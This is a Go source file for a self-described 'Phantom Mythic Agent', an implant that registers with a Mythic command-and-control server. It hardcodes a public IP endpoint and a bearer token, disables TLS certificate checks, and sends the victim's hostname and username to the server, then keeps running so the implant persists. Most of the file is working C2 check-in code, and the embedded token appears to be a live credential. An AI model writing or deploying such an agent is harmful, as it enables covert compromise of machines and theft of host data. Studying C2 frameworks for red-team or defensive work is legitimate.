package main

import (
        "bytes"
        "crypto/tls"
        "encoding/json"
        "fmt"
        "io"
        "net/http"
        "os"
        "os/user"
        "runtime"
        "time"
)

const (
        MYTHIC_URL = "https://37.27.249.191:7443/graphql/"
        JWT_TOKEN  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxNzMxMTAsImlhdCI6MTc1MDE1ODcxMCwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjE3LCJvcGVyYXRpb25faWQiOjB9.ok5pb1TKFiGGsvcWGc1LdQIM48Y1KqeXRGmmtXWKIDM"
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   interface{} `json:"data"`
        Errors []struct {
                Message string `json:"message"`
        } `json:"errors"`
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }

        reqBody := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }

        jsonBody, err := json.Marshal(reqBody)
        if err != nil {
                return nil, fmt.Errorf("error marshaling request: %v", err)
        }

        fmt.Printf("[DEBUG] Request body: %s\n", string(jsonBody))

        req, err := http.NewRequest("POST", MYTHIC_URL, bytes.NewBuffer(jsonBody))
        if err != nil {
                return nil, fmt.Errorf("error creating request: %v", err)
        }

        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("Authorization", "Bearer "+JWT_TOKEN)

        resp, err := client.Do(req)
        if err != nil {
                return nil, fmt.Errorf("error making request: %v", err)
        }
        defer resp.Body.Close()

        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, fmt.Errorf("error reading response: %v", err)
        }

        fmt.Printf("[DEBUG] Response status: %d\n", resp.StatusCode)
        fmt.Printf("[DEBUG] Response body: %s\n", string(body))

        var gqlResp GraphQLResponse
        if err := json.Unmarshal(body, &gqlResp); err != nil {
                return nil, fmt.Errorf("error unmarshaling response: %v", err)
        }

        return &gqlResp, nil
}

func registerCallback() error {
        fmt.Println("=== PHANTOM MYTHIC AGENT - RESPONSE RAW VERSION ===")
        fmt.Printf("Platform: %s %s\n", runtime.GOOS, runtime.GOARCH)
        fmt.Printf("PID: %d\n", os.Getpid())
        fmt.Printf("Mythic URL: %s\n", MYTHIC_URL)
        fmt.Println("Registering callback with Mythic...")

        hostname, _ := os.Hostname()
        user, _ := user.Current()

        query := `
        mutation createCallback($payloadUuid: String!, $newCallback: newCallbackConfig!) {
                createCallback(
                        payloadUuid: $payloadUuid,
                        newCallback: $newCallback
                ) {
                        status
                        error
                }
        }`

        variables := map[string]interface{}{
                "payloadUuid": "9df7dfc4-f21d-4b03-9962-9f3272669b85",
                "newCallback": map[string]interface{}{
                        "user": user.Username,
                        "host": hostname,
                        "ip":   "192.168.1.100",
                },
        }

        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }

        if len(resp.Errors) > 0 {
                fmt.Printf("Registration errors: %v\n", resp.Errors)
                return fmt.Errorf("registration failed with errors")
        }

        fmt.Printf("Registration successful: %v\n", resp.Data)
        return nil
}

func main() {
        if err := registerCallback(); err != nil {
                fmt.Printf("Failed to register with Mythic: %v\n", err)
                os.Exit(1)
        }

        fmt.Println("Agent registered successfully!")
        
        // Keep running for testing
        for {
                time.Sleep(30 * time.Second)
                fmt.Println("Agent running...")
        }
}